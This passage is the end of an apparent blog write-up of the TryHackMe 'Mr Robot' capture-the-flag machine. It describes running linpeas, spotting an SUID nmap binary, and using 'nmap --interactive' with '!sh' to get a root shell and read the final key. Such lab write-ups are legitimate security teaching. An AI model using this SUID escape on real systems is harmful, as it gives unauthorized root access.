class="line">./linpeas.sh | tee linout.txt</span><br></pre></td></tr></table></figure><p>As usual, linpeas found a shitload of things but something that stood out to me was the ‚Äúnmap‚Äù entry in the SUID section.</p><p>A quick search on <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a> shows us that a root shell is just a few lines of code away.</p><img src="/2020/07/09/Mr-Robot-TryHackMe/gtfobins.png" class="" title="GTFOBins"><p>I used the second option, so spawn an interactive nmap shell and get a root shell.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure><p>And there you go, you have a root shell! I didn‚Äôt stabilize it this time, just because we don‚Äôt work in it very long.</p><p>Now we can have a look inside of the /root/ directory and we see the third key.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># whoami</span><br><span class="line">root</span><br><span class="line"># pwd</span><br><span class="line">&#x2F;root&#x2F;</span><br><span class="line"># cat key-3-of-3.txt</span><br><span class="line">key3</span><br></pre></td></tr></table></figure><h2 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h2><p>And there you have it! I hope you had fun, I know I did ü¶Ñ</p>]]></content>
      
      
      <categories>
          
          <category> pentesting </category>
          
          <category> writeups </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
